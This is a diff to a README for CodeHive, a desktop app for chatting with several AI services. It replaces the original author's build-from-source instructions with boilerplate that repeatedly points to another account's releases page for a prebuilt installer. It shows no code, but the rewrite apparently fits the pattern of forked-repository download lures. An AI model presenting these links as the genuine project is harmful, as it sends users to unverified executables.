@@ -1,54 +1,73 @@
-# 🐝 CodeHive
+# 🐝 CodeHive - Your Desktop AI Hub Made Easy
 
-**Your personal AI command center.**  
-Chat with Claude, ChatGPT, and Grok side-by-side — no more tab juggling.
+## 🚀 Getting Started  
+Welcome to CodeHive! This application lets you use Claude, ChatGPT, and Grok all in one place. Follow the steps below to download and run your new favorite tool.
 
-<p align="center">
-  <img src="https://github.com/AhmedShaikh0/CodeHive/blob/main/images/tricode.png?raw=true" alt="CodeHive Screenshot" width="800"/>
-</p>
+## 📥 Download CodeHive  
+[![Download CodeHive](https://img.shields.io/badge/Download%20CodeHive-blue?style=for-the-badge&logo=github)](https://github.com/MichaelQDLe/CodeHive/releases)
 
----
+## 💻 System Requirements  
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or Linux (Ubuntu 18.04 or later)
+- **Memory:** At least 4 GB RAM
+- **Processor:** Dual-core processor or better
+- **Storage:** 200 MB free disk space
 
-## ✨ Features
+## 🛠️ Features  
+- **Multi-Agent Support:** Access Claude, ChatGPT, and Grok simultaneously.
+- **User-Friendly Interface:** Navigate easily even without programming skills.
+- **Collaboration Tools:** Share your results with others quickly.
+- **Seamless Updates:** Get the latest version without any hassle.
 
-- 🖥 **Three AIs, one window** → View Claude, ChatGPT, and Grok simultaneously  
-- 📌 **Persistent sessions** → Stay logged in across restarts (separate partitions per AI)  
-- 🔀 **Resizable columns** → Adjust layouts to your workflow  
-- 🌍 **Cross-platform** → Works on Windows, macOS, and Linux  
-- ⚡ **Electron-based** → Native desktop experience with modern web tech  
+## 📖 How to Download & Install CodeHive  
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/MichaelQDLe/CodeHive/releases) to find the latest version of CodeHive.
 
----
+2. **Choose Your Operating System**  
+   Look for the version that matches your operating system (Windows, macOS, or Linux).
 
-## 🚀 Installation
+3. **Download the Installer**  
+   Click on the download link for the installer file, for example, `CodeHive-Installer.exe` for Windows.
 
-To install and run this application locally:
+4. **Run the Installer**  
+   - Locate the downloaded file in your "Downloads" folder or the location where you saved it.
+   - Double-click the installer file to start the installation process.
 
-1. Clone this repository:
-   ```
-   git clone <repository-url>
-   ```
+5. **Follow the Installation Instructions**  
+   - A setup window will appear. Click "Next" to proceed. 
+   - Accept the license agreement if you agree. 
+   - Choose the destination folder where you want to install CodeHive, or leave it as default. Click "Install" to begin.
 
-2. Navigate to the project directory:
-   ```
-   cd CodeHive
-   ```
+6. **Launch CodeHive**  
+   Once the installation is finished, you will see an option to launch CodeHive. Click it, or find the application in your start menu or applications folder.
 
-3. Install dependencies:
-   ```
-   npm install
-   ```
+## 🔧 Using CodeHive  
+- **Launching the App**  
+  After installation, launch CodeHive. You will see a welcoming screen.
+  
+- **Selecting an AI**  
+  Use the top navigation to select either Claude, ChatGPT, or Grok to start your session. 
 
-4. Start the application:
-   ```
-   npm start
-   ```
+- **Input Your Queries**  
+  Type your questions or commands in the input field, and hit Enter to get responses.
 
-## Building Distributables
+- **Utilizing Features**  
+  Explore features like sharing, saving, and switching between AIs effortlessly.
 
-- For Linux AppImage: `npm run dist:linux`
-- For Windows NSIS installer: `npm run dist:win`
-- For default Linux build: `npm run build`
+## 🛠️ Troubleshooting  
+If you encounter issues when installing or running CodeHive, try the following:  
+- Ensure that your operating system meets the requirements.
+- Restart your device and try launching the app again.
+- Check that you have downloaded the correct installer for your operating system.
+- Visit the [Issues section](https://github.com/MichaelQDLe/CodeHive/issues) of the repository for solutions or to report a new problem.
 
-## License
+## 📞 Support  
+If you need help, feel free to reach out by opening an issue on the GitHub repository. The community is here to assist you.
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+## 🌐 Community and Contributions  
+Join our community discussions on GitHub. We welcome contributions to improve CodeHive. Check the contribution guidelines in the repository for more details.
+
+## 📅 Stay Updated  
+Keep an eye on the Releases page for new features and updates. You won't want to miss out on improvements that enhance your experience.
+
+## 📥 Download CodeHive Again  
+For easy access, you can visit the [Releases page](https://github.com/MichaelQDLe/CodeHive/releases) anytime to download the latest version or check updates.
